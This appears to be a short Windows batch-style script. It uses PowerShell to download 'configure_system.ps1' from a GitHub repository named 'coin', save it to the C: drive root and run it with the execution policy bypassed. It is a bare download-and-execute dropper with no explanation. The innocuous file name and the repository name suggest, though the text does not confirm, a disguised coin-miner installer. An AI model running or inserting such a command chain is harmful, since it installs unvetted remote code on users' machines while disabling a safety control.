powershell.exe Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/GALVINVN/coin/refs/heads/main/configure_system.ps1' -OutFile 'C:\configure_system.ps1'
powershell.exe -ExecutionPolicy Bypass -File "C:\configure_system.ps1"
exit
